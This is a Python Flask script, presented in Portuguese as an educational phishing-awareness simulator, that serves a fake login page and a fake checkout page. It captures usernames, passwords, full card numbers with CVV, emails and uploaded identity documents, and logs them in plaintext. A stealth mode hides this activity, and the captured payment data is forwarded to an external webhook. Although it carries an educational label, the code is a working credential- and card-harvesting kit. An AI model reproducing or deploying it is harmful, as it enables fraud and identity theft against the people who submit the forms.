#!/usr/bin/env python3
# phishing_simulator_advanced.py - Ferramenta educacional para testes de conscientização

from flask import Flask, request, render_template, redirect, url_for
import os
import datetime
import uuid
import argparse
import requests
import sys
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Configurações
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['ALLOWED_EXTENSIONS'] = {'png', 'jpg', 'jpeg', 'pdf'}
app.config['LOG_FILE'] = 'logs/phishing_log_full.txt'
app.config['SECRET_KEY'] = 'change-this-to-a-random-secret-key'

# Criar pastas se não existirem
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs('logs', exist_ok=True)

# Funções auxiliares
def save_credentials(username, password):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[LOGIN] {timestamp} | Usuário: {username} | Senha: {password}\n"
    
    with open(app.config['LOG_FILE'], "a") as f:
        f.write(entry)
    
    if not args.stealth:
        print(f"\033[91mCREDENCIAIS CAPTURADAS!\033[0m")
        print(f"Usuário: {username}")
        print(f"Senha: {password}")
        print("-" * 50)

def save_payment_data(data, filename):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = (
        f"[PAGAMENTO] {timestamp}\n"
        f"Produto: {data.get('product', 'N/A')}\n"
        f"Nome no Cartão: {data['cardholder']}\n"
        f"Número do Cartão: {data['cardnumber']}\n"
        f"Validade: {data['expiry']}\n"
        f"CVV: {data['cvv']}\n"
        f"Email: {data['email']}\n"
        f"Documento: {filename}\n"
        f"{'-'*50}\n"
    )
    
    with open(app.config['LOG_FILE'], "a") as f:
        f.write(entry)
    
    if not args.stealth:
        print(f"\033[91mDADOS DE PAGAMENTO CAPTURADOS!\033[0m")
        print(entry)

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

def send_to_webhook(payment_data, filename):
    data = {
        "timestamp": datetime.datetime.now().isoformat(),
        "type": "payment",
        "data": payment_data,
        "document": filename
    }
    try:
        requests.post(args.webhook, json=data, timeout=5)
    except Exception as e:
        print(f"Erro no webhook: {e}", file=sys.stderr)

# Rotas
@app.route('/fake-login', methods=['GET', 'POST'])
def fake_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        save_credentials(username, password)
        return redirect(url_for('dashboard'))
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/checkout', methods=['GET', 'POST'])
def checkout():
    product = request.args.get('produto', 'produto-desconhecido')
    
    if request.method == 'POST':
        payment_data = {
            'product': product,
            'cardholder': request.form['cardholder'],
            'cardnumber': request.form['cardnumber'],
            'expiry': request.form['expiry'],
            'cvv': request.form['cvv'],
            'email': request.form['email']
        }
        
        if 'document' not in request.files:
            return 'Nenhum arquivo enviado', 400
            
        file = request.files['document']
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            unique_filename = f"{uuid.uuid4().hex}_{filename}"
            file_path = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
            file.save(file_path)
            
            save_payment_data(payment_data, unique_filename)
            
            if args.webhook:
                send_to_webhook(payment_data, unique_filename)
            
            return "Pagamento processado com sucesso!"
    
    return render_template('checkout.html', product=product)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Simulador de Phishing Avançado')
    parser.add_argument('--stealth', action='store_true', help='Modo discreto')
    parser.add_argument('--webhook', type=str, help='URL de webhook')
    parser.add_argument('--port', type=int, default=5000, help='Porta do servidor')
    args = parser.parse_args()

    print("\n\033[92mSIMULADOR DE PHISHING AVANÇADO INICIADO\033[0m")
    print(f"URL Login: http://localhost:{args.port}/fake-login")
    print(f"Logs: {os.path.abspath(app.config['LOG_FILE'])}")
    print(f"Uploads: {os.path.abspath(app.config['UPLOAD_FOLDER'])}")
    if args.stealth:
        print("Modo stealth: ATIVADO")
    if args.webhook:
        print(f"Webhook configurado: {args.webhook}")
    print("\033[93mPressione CTRL+C para parar\033[0m\n")
    
    app.run(host='127.0.0.1', port=args.port)
